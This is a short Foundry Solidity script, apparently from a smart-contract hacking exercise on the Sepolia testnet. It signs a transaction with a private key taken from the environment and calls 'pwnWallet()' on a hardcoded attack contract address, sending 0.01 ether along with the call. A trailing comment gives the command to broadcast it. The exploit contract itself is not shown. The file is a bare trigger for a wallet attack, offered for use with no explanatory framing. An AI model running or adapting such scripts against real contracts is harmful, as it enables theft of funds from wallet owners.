// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// attack: 0xbb0726B4C7a7194d43d8B16d30315089f025CF12

// interface IAttack {
//     function pwnWallet() external;
// }

contract TriggerAttack is Script {
    uint256 privateKey = vm.envUint("PRIVATE_KEY");

    // address account = vm.addr(privateKey);
    // IAttack public attack;

    function run() external {
        address attackAddr = 0xbb0726B4C7a7194d43d8B16d30315089f025CF12;
        bytes memory payload = abi.encodeWithSignature("pwnWallet()");

        vm.startBroadcast(privateKey);
        // attack = IAttack(attackAddr);

        (bool success, ) = attackAddr.call{value: 10000000000000000}(payload);
        if (!success) revert("Unsuccessful transaction!");

        vm.stopBroadcast();
    }
}
// */

// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vv
